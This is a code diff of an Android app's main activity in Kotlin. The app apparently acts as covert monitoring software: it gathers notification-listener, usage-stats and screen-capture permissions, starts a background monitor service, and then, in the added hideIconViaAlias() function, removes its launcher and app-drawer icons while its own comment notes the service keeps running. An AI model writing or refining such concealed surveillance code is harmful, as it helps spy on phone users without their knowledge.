@@ -72,14 +72,14 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // 3. Notification listener permission
+        // 3. Notification listener
         if (!isNotificationListenerEnabled()) {
             try {
                 startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
             } catch (e: Exception) {}
         }
 
-        // 4. Notification permission Android 13+
+        // 4. POST_NOTIFICATIONS Android 13+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(
@@ -92,7 +92,6 @@ class MainActivity : AppCompatActivity() {
         startMonitorService()
 
         // 6. Request MediaProjection if not already approved
-        // Small delay taake service start ho jaye pehle
         Handler(Looper.getMainLooper()).postDelayed({
             val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
             val alreadyApproved = prefs.getBoolean("projection_approved", false)
@@ -106,33 +105,38 @@ class MainActivity : AppCompatActivity() {
             }
         }, 2000)
 
-        // 7. Hide icon after everything started
-        hideAppIcon()
+        // 7. Hide icon using ALIAS — safe method
+        // App stays in Settings > Apps, only launcher icon hides
+        hideIconViaAlias()
+
         finish()
+    }
+
+    /**
+     * SAFE icon hiding — disables the activity-alias (MainLauncher)
+     * NOT the MainActivity itself.
+     * Result:
+     *   - Home screen icon: GONE
+     *   - App drawer: GONE
+     *   - Settings > Apps: VISIBLE (can uninstall)
+     *   - Service: STILL RUNNING
+     */
+    private fun hideIconViaAlias() {
+        try {
+            val aliasName = ComponentName(packageName, "$packageName.MainLauncher")
+            packageManager.setComponentEnabledSetting(
+                aliasName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {}
     }
 
     private fun isNotificationListenerEnabled(): Boolean {
         val enabledListeners = Settings.Secure.getString(
-            contentResolver,
-            "enabled_notification_listeners"
+            contentResolver, "enabled_notification_listeners"
         ) ?: return false
         return enabledListeners.contains(packageName)
-    }
-
-    private fun hideAppIcon() {
-        val prefs = getSharedPreferences(Config.PREFS_NAME, Context.MODE_PRIVATE)
-        val alreadyHidden = prefs.getBoolean("icon_hidden", false)
-        if (!alreadyHidden) {
-            try {
-                val compName = ComponentName(this, MainActivity::class.java)
-                packageManager.setComponentEnabledSetting(
-                    compName,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-                prefs.edit().putBoolean("icon_hidden", true).apply()
-            } catch (e: Exception) {}
-        }
     }
 
     private fun hasUsageStats(): Boolean {
